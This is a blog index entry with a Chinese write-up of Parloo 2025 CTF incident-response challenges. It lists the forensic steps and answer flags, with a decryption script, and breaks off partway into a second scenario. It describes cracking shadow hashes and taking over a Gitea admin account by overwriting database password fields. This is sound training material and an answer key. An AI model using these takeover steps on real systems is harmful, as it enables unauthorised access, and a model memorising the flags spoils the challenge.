<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Parloo杯2025初赛 writeup+复现</title>
      <link href="/posts/f6af6eda/"/>
      <url>/posts/f6af6eda/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这波Aura✌tql，仅凭一己之力干完了应急响应，本菜鸡直接被带飞OrzOrz</p><p>比赛的时候根本跟不上aura✌的进度，虽说看了题但是没做几道，现在好好复现一下。</p><p>除了应急响应以外的题就不复现了，都是musc。。。</p></blockquote><h1 id="主线"><a href="#主线" class="headerlink" title="主线"></a>主线</h1><p><a href="https://www.blog.st4rr.top/writeups/%E7%AC%AC%E4%BA%8C%E5%B1%8A%22Parloo%22CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9C%BA%E6%99%AF%E6%8C%91%E6%88%98%E8%AF%B4%E6%98%8E%E6%89%8B%E5%86%8C.pdf">第二届“Parloo”CTF应急响应挑战赛应急响应场景挑战说明手册.pdf</a></p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p> **提交堡垒机中留下的flag<br>****附件下载地址：百度网盘 <a href="https://pan.baidu.com/s/1otqDnpKTOEsPZQiWSE8ECg?pwd=6666">https://pan.baidu.com/s/1otqDnpKTOEsPZQiWSE8ECg?pwd=6666</a> 提取码: 6666 夸克网盘 <a href="https://pan.quark.cn/s/46653bd06cca">https://pan.quark.cn/s/46653bd06cca</a> 123云盘 <a href="https://www.123865.com/s/qDVvjv-zVBod">https://www.123865.com/s/qDVvjv-zVBod</a> 提取码:6666<br>***<em>解压密码：应急响应环境解压密码网络拓扑环境 Skills@@@Skills@@@Skills 畸行的爱 Parloo&amp;zgsfsys&amp;onefox&amp;solar*<em>juyt</em></em>  </p><p>登录面板即可看到flag</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747819042954-ffc480dd-977b-4d4d-a3a7-93a24d2d9dab.png" alt="img"></p><p>palu{2025_qiandao_flag}</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p> <strong>提交WAF中隐藏的flag</strong></p><p>进入雷池面板即可找到</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747819226193-e671f80c-050b-4e1d-b0be-d46d44d0216f.png" alt="img"></p><p>palu{2025_waf}</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p> <strong>提交Mysql中留下的flag</strong></p><p>先在面板中搜索一下flag</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747819606208-bee2a8bb-4daf-4f68-8d55-3527abbbf7bd.png" alt="img"></p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747819770683-2a9b8cb7-8903-4311-8379-f294c455ca64.png" alt="img"></p><p>palu{Mysql_@2025}</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><strong>提交攻击者的攻击IP</strong></p><p>看waf的拦截记录</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747820002829-57e4d755-f119-4146-b9ac-254c80c5a88f.png" alt="img"></p><p>palu{192.168.20.107}</p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p> <strong>提交攻攻击者最早攻击时间flag格式为palu{xxxx-xx-xx-xx-xx-xx}</strong>  </p><p>这题题目要求的格式有问题。。。</p><p>由上题可知</p><p>palu{2025-05-05-00:04:40}</p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p> <strong>提交web服务泄露的关键文件名</strong>  </p><p>waf中查看路由配置，可以看到泄露了一个key.txt</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747821075622-90ea8c48-1aac-47e2-b762-4193c1875734.png" alt="img"></p><p>palu{key.txt}</p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p> <strong>提交泄露的邮箱地址</strong>  </p><p>访问一下这个泄露的路由可以看到里面有提到邮箱</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747821234372-b1407bc8-a4f0-4879-9a13-2d349f61d8fa.png" alt="img"></p><p>palu{<a href="mailto:&#x70;&#97;&#114;&#x6c;&#x6f;&#x6f;&#64;&#x70;&#97;&#114;&#x6c;&#111;&#111;&#46;&#x63;&#111;&#109;">&#x70;&#97;&#114;&#x6c;&#x6f;&#x6f;&#64;&#x70;&#97;&#114;&#x6c;&#111;&#111;&#46;&#x63;&#111;&#109;</a>}</p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p> <strong>提交立足点服务器ip地址</strong>  </p><p>192.168.20.108是sshserver的ip，但是却存在攻击行为，因此可以判断是立足点服务器</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747821429152-ab5b4fb6-5681-47d0-bf50-b4d5156a9136.png" alt="img"></p><p>palu{192.168.20.108}</p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p> <strong>提交攻击者使用的提权的用户和密码</strong></p><p><strong>提交格式</strong></p><p><strong>palu{账号&#x2F;密码}</strong>  </p><p>在sshserver中找到恶意用户的账密密文</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747821984530-7bdc793a-966c-4ae1-99ba-363dddd110d6.png" alt="img"></p><p>用jtr爆破一下</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747822155351-ecfc6e3d-6b2d-4671-b39b-9f4ad79bafed.png" alt="img"></p><p>palu{parloo&#x2F;parloo}</p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><strong>提交攻击者留下的的文件内容作为flag提交</strong></p><p>在sshserver的&#x2F;home&#x2F;parloo下</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747825487411-d8010ef2-1ce2-45cd-ace3-57266259352f.png" alt="img"></p><p>palu{hi_2025_parloo_is_hack}</p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p> <strong>提交权限维持方法服务的名称</strong>  </p><p>列出sshserver上正在运行的服务</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747826069831-1c8e91d3-75a2-41c0-89df-14416e5f5657.png" alt="img"></p><p>palu{rootset}</p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><strong>提交攻击者攻击恶意服务器连接地址作为flag提交</strong></p><p>在server中可以找到一个叫aa的程序，提取出来</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747826638130-eb8cef89-3296-4af9-9423-09af96bea967.png" alt="img"></p><p>丢进IDA就能看见</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747826863101-aabfaf56-41a3-4b61-97d3-bba8cbd4f934.png" alt="img"></p><p>palu{47.101.213.153}</p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p> <strong>找到系统中被劫持的程序程序名作为flag提交</strong>  </p><p>在sshserver中对&#x2F;usr&#x2F;bin下的程序按照修改时间排序</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747897866224-9f221562-5cc7-4a47-b2ee-0ec0bed1dd91.png" alt="img"></p><p>palu{id}</p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p> <strong>找到系统中存在信息泄露的服务运行端口作为flag提交</strong>  </p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747894563043-a84b7cd6-b9b3-4269-bcfc-2ba2307248ce.png" alt="img"></p><p>palu{8081}</p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><strong>提交Parloo公司项目经理的身份证号作为flag提交</strong></p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747894636012-cc5958e4-fb6e-4103-aa5b-7de66f4ff9aa.png" alt="img"></p><p>palu{310105198512123456}</p><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p> <strong>提交存在危险功能的操作系统路径作为flag提交。flag格式为palu{&#x2F;xxx&#x2F;xxx}</strong>  </p><p>可以看到存在危险路由</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747895540946-803a40ae-3b52-4a57-b043-a2300450575d.png" alt="img"></p><p>palu{admin&#x2F;parloo}</p><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p> <strong>提交进源机器中恶意程序的MD5作为flag进行提交。 flag格式为palu{MD5小写}</strong>  </p><p>可以发现palu03机器的temp文件夹中存在一个奇怪的文件，同时也可以注意到机器开机时就报的一个错svhost.exe已停止运行</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747896309072-7e8116ea-5a07-4000-8f76-0083080805cb.png" alt="img"></p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747896499300-a1286f9e-add2-48ae-bbc8-9c54a593833c.png" alt="img"></p><p>palu{0f80a92621b8c4c3303d198d13776b34}</p><h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p> <strong>提交攻击者留下的恶意账户名称md5后作为flag进行提交。 格式为palu{md5{xxxxx}}</strong>  </p><p>登录时发现有个hack用户</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747896650010-594b23dc-dade-4af8-873a-256b7b63bffb.png" alt="img"></p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747896698180-133d9e8a-0639-4044-9f2b-8384899dd8f1.png" alt="img"></p><p>palu{d78b6f30225cdc811adfe8d4e7c9fd34}</p><h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p> <strong>提交内部群中留下的flag并提交</strong>  </p><p>查看聊天记录就能看到</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747896804193-ddeb1d4a-0b8f-4e10-85eb-fcf60bbb490e.png" alt="img"></p><p>palu{nbq_nbq_parloo}</p><h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p> <strong>请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交</strong>  </p><p>server中cat &#x2F;var&#x2F;log&#x2F;parloo&#x2F;command.log查看日志即可看到</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747897076583-4a2cac25-5ea1-4034-bcc3-82c571e5712d.png" alt="img"></p><p>palu{Server_Parloo_2025}</p><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p> <strong>提交获取敏感内容IP的第一次执行命令时间作为flag进行提交。flag格式为palu{xxxx-xx-xx:xx:xx:xx}</strong>  </p><p>根据上题日志</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747897311887-468a983b-ab06-4285-bd14-fbafaa5d895f.png" alt="img"></p><p>palu{2025-05-04:15:30:38}</p><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><p> <strong>提交攻击者使用的恶意ip和端口flag格式为palu{xx.xx.xx.xx:xxxx}</strong>  </p><p>根据上题日志，可以看到一个反弹shell的命令</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747897446411-d95866bc-8162-4d37-b3ee-a261b1351658.png" alt="img"></p><p>palu{10.12.12.13:9999}</p><h2 id="23"><a href="#23" class="headerlink" title="23*"></a>23*</h2><p><strong>提交重要数据的明文内容作为flag提交</strong></p><p>gitea中还有个hack用户，仓库中有个加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    encrypted = []</span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">        shifted = <span class="built_in">ord</span>(char) + (i % <span class="number">5</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[i % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        xored = shifted ^ xor_key</span><br><span class="line">        substituted = ((xored &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((xored &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">        encrypted.append(<span class="string">f&quot;<span class="subst">&#123;substituted:02x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(encrypted)</span><br></pre></td></tr></table></figure><p>然后不知道怎么推出来的密钥是MySecretKey，看其他wp说是根据flag的头部是palu{推出来的，不懂（</p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">2</span>):</span><br><span class="line">        hex_byte = ciphertext[i:i+<span class="number">2</span>]</span><br><span class="line">        substituted = <span class="built_in">int</span>(hex_byte, <span class="number">16</span>)</span><br><span class="line">        xored = ((substituted &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((substituted &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[(i // <span class="number">2</span>) % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        shifted = xored ^ xor_key</span><br><span class="line"></span><br><span class="line">        original_char_code = shifted - ((i // <span class="number">2</span>) % <span class="number">5</span> + <span class="number">1</span>)</span><br><span class="line">        decrypted.append(<span class="built_in">chr</span>(original_char_code))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;MySecretKey&quot;</span></span><br><span class="line">ciphertext = <span class="string">&quot;c3a1c3c13e326020c3919093e1260525045e&quot;</span></span><br><span class="line">plaintext = custom_decrypt(ciphertext, key)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><p>palu{Password-000}</p><h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><p> <strong>提交恶意维权软件的名称作为flag进行提交</strong>  </p><p>就是第17题中那个程序</p><p>palu{svhost}</p><h2 id="25"><a href="#25" class="headerlink" title="25"></a>25</h2><p><strong>提交恶意程序的外联地址</strong></p><p>在palu03机器中，用户文件夹下有个明显奇怪的用python写的ipconfig程序</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747898114891-0ee1d71a-fe08-41c8-86f9-70b66d6dd154.png" alt="img"></p><p>简单逆向一下就能看到ip</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747898489537-7e1e32fa-6888-41f9-87bf-b383f70a11c3.png" alt="img"></p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747898548470-53c83233-ae1b-4494-94d2-43ad0cef3b6d.png" alt="img"></p><p>palu{88.173.90.103}</p><h2 id="26"><a href="#26" class="headerlink" title="26"></a>26</h2><p> <strong>提交攻击者使用的恶意dnslog域名作为flag进行提交</strong>  </p><p>继续看之前的日志</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747899149467-033f66d7-c1ad-49f3-98b9-fbd8db4a1452.png" alt="img"></p><p>palu{np85qqde.requestrepo.com}</p><h2 id="27"><a href="#27" class="headerlink" title="27"></a>27</h2><p> <strong>提交寻找反序列化漏洞的端口作为flag进行提交</strong>  </p><p>都是常见服务端口，除了8081前面用过了，那就只能是9999了</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747899322980-bce34261-cadd-46c0-bf33-b5f2c64dd61d.png" alt="img"></p><p>palu{9999}</p><h2 id="28"><a href="#28" class="headerlink" title="28"></a>28</h2><p> <strong>提交web服务泄露的密钥作为flag进行提交</strong>  </p><p>在&#x2F;opt下有个adminAF.jar</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747899959110-14effb1a-2ba0-4e70-9e7d-93b966bb6622.png" alt="img"></p><p>拿出来逆向一下</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747900166709-86890ded-132e-4481-b316-514d867818c0.png" alt="img"></p><p>palu{QZYysgMYhG6&#x2F;CzIJlVpR2g&#x3D;&#x3D;}</p><h2 id="29"><a href="#29" class="headerlink" title="29*"></a>29*</h2><p> <strong>提交攻击者开始攻击的时间作为flag进行提交。flag各式为palu{xxxx&#x2F;xx&#x2F;xx:xx:xx:xx}</strong>  </p><p>未知flag</p><h2 id="30"><a href="#30" class="headerlink" title="30"></a>30</h2><p><strong>提交攻击者在server中留下的账户密码作为flag进行提交。flag格式为palu{username&#x2F;password}</strong></p><p>查看&#x2F;etc&#x2F;shadow</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747900380817-8755c748-94d0-4e87-81c7-238a0f78ac1a.png" alt="img"></p><p>jtr爆破</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747900603728-41067e47-7e6e-4c8e-93a2-b4c9346e3d57.png" alt="img"></p><p>palu{parloohack&#x2F;123456}</p><h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><p> <strong>提交攻击者维权方法的名称作为flag进行提交</strong>  </p><p>可以看到开机自启项中有一个可疑服务</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747900881184-0b2f8c02-2e23-4bea-aca3-10bd07acd031.png" alt="img"></p><p>palu{parloohack_script.service}</p><h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><p> <strong>提交攻击者留下的木马md5后作为flag进行提交</strong>  </p><p>就是第12题中的aa</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747901057694-24cd4092-4f50-4d71-86ad-3cbfbfe97e0a.png" alt="img"></p><p>palu{4123940b3911556d4bf79196cc008bf4}</p><h2 id="33"><a href="#33" class="headerlink" title="33"></a>33</h2><p> <strong>提交攻击者留下的溯源信息作为flag进行提交</strong>  </p><p>在palu02机器中，google浏览器中保存了两个用户，其中一个用户的备注里有flag</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747901276083-6e789e27-a161-4e02-ab51-4c16232f10f7.png" alt="img"></p><p>palu{X5E1yklz1oAdyHBZ}</p><h2 id="34"><a href="#34" class="headerlink" title="34"></a>34</h2><p> <strong>提交攻击者的githubID作为flag进行提交</strong>  </p><p>上面的用户名是一个QQ号码，访问这个账号的空间有一条说说</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747901534926-141d3a9e-436a-4da4-9e5a-7516f9c2c878.png" alt="img"></p><p>palu{ParlooSEc}</p><h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><p> <strong>提交攻击者在github下留下的的内容作为flag进行提交</strong>  </p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747901665658-8819c454-165e-41e3-973d-d0a1facb7d54.png" alt="img"></p><p>palu{s5o3WkX33hptyJjk}</p><h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><p> <strong>提交恶意用户的数量作为flag进行提交</strong>  </p><p>palu01机器中除了Parloo用户外还有99个用户</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747901770754-c35edb53-9a09-4c90-b026-940138e3293c.png" alt="img"></p><p>palu{99}</p><h2 id="37"><a href="#37" class="headerlink" title="37"></a>37</h2><p> <strong>提交恶意用户的默认密码作为flag进行提交</strong>  </p><p>在palu01机器上可以找到一个叫a.vbs的脚本，是用来生成用户的</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747902141506-b9a516bc-0307-4f62-8b3b-42e76470079f.png" alt="img"></p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747902189846-bdf3fd31-cbb4-4c57-b965-5c4cba14c257.png" alt="img"></p><p>palu{123456}</p><h2 id="38"><a href="#38" class="headerlink" title="38"></a>38</h2><p> <strong>提交业务数据中攻击者留下的信息作为flag进行提交</strong>  </p><p>连接mysql服务器中的gitea的数据库</p><p>看user表，有一个用户的密码是flag</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747902459929-7933319c-f2f4-4d1d-a83c-51448ae4e954.png" alt="img"></p><p>palu{crP1ZIVfqrkfdhGy}</p><h2 id="39"><a href="#39" class="headerlink" title="39"></a>39</h2><p> <strong>提交私人git仓库中留下的内容作为flag进行提交</strong>  </p><p>自己注册一个账户，然后把admin账户的passwd，rands，salt三个列都替换成我们新生成账户的</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747902685325-bd654912-bb9f-493b-bc66-7edaa58234cd.png" alt="img"></p><p>用我们新帐户的密码就能登陆admin，查看git仓库</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747902932418-8603124d-18de-4311-b1f3-2171ef0590db.png" alt="img"></p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747902957139-af9179eb-7c46-4c38-b8c0-a5d4f223369b.png" alt="img"></p><h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><p> <strong>提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交</strong>  </p><p>存在一个叫.a的程序</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747903116602-47673a45-486d-4f89-b095-5938d04eeba4.png" alt="img"></p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747903191036-cae3eedf-ebf7-4d04-8dd5-e59c3c5ef950.png" alt="img"></p><p>palu{ba7c9fc1ff58b48d0df5c88d2fcc5cd1}</p><h2 id="41"><a href="#41" class="headerlink" title="41"></a>41</h2><p> <strong>提交恶意程序中模拟c2通信的函数名称作为flag进行提交</strong>  </p><p>把.a提取出来逆向一下就行</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747903380304-f2f9fb51-dfb6-4f59-b26b-18865658ae40.png" alt="img"></p><p>palu{simulate_network_communication}</p><h2 id="42"><a href="#42" class="headerlink" title="42"></a>42</h2><p> <strong>提交恶意程序创建隐藏文件的名称作为flag提交</strong>  </p><p>进入加密函数看一下</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747903481651-74237f81-4110-4239-b87a-2a69fd436f34.png" alt="img"></p><p>palu{.malware_log.txt}</p><h2 id="43"><a href="#43" class="headerlink" title="43"></a>43</h2><p> <strong>提交恶意程序中模拟权限提升的函数作为flag进行提交</strong>  </p><p>由第41题</p><p>palu{simulate_privilege_escalation}</p><h2 id="44"><a href="#44" class="headerlink" title="44"></a>44</h2><p> <strong>提交被钓鱼上线的用户名作为flag进行提交</strong>  </p><p>palu02机器中还有一段聊天记录</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747903829028-43adab84-b583-430c-8a3f-898e67070a85.png" alt="img"></p><p>palu{Parloo-子怡}</p><h2 id="45"><a href="#45" class="headerlink" title="45"></a>45</h2><p> <strong>提交恶意程序的所在路径作为flag进行提交</strong>  </p><p>由上题</p><p>palu{C:\Users\Public\Nwt\cache\recv\Parloo-沉沉}</p><h2 id="46"><a href="#46" class="headerlink" title="46"></a>46</h2><p><strong>分析恶意程序的反连地址作为flag进行提交</strong></p><p>从google浏览器的历史记录中就能看出</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747904048187-684f8359-05d0-4e94-8877-b89f4a6e695d.png" alt="img"></p><p>palu{47.101.213.153}</p><h2 id="47"><a href="#47" class="headerlink" title="47"></a>47</h2><p> <strong>提交恶意c2的服务器登录的账号密码作为flag进行提交。flag格式为palu{username&#x2F;password}</strong>  </p><p>看google浏览器密码管理器中保存的密码即可</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747904148716-dbcac2b0-dc80-470d-b0d7-e9a657461e25.png" alt="img"></p><p>palu{admin&#x2F;admin@qwer}</p><h1 id="畸形的爱"><a href="#畸形的爱" class="headerlink" title="畸形的爱"></a>畸形的爱</h1><p><a href="https://www.blog.st4rr.top/writeups/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1.pdf">应急响应之畸形的爱.pdf</a></p><h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><p> **提交攻击者使用的攻击ip地址1<br>****flag格式为：palu{xxxx}<br>****附件下载地址：百度网盘 <a href="https://pan.baidu.com/s/1otqDnpKTOEsPZQiWSE8ECg?pwd=6666">https://pan.baidu.com/s/1otqDnpKTOEsPZQiWSE8ECg?pwd=6666</a> 提取码: 6666 夸克网盘 <a href="https://pan.quark.cn/s/46653bd06cca">https://pan.quark.cn/s/46653bd06cca</a> 123云盘 <a href="https://www.123865.com/s/qDVvjv-zVBod">https://www.123865.com/s/qDVvjv-zVBod</a> 提取码:6666<br>***<em>解压密码：应急响应环境解压密码网络拓扑环境 Skills@@@Skills@@@Skills 畸行的爱 Parloo&amp;zgsfsys&amp;onefox&amp;solar*<em>juyt</em></em>  </p><p>查看webserver中nginx的日志</p><p><img src="/images/Parloo%E6%9D%AF2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1747916775093-e3671b64-67f7-495e-90af-dfda98f77f2d.png" alt="img"></p><p>palu{192.168.31.240}</p><h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><p> 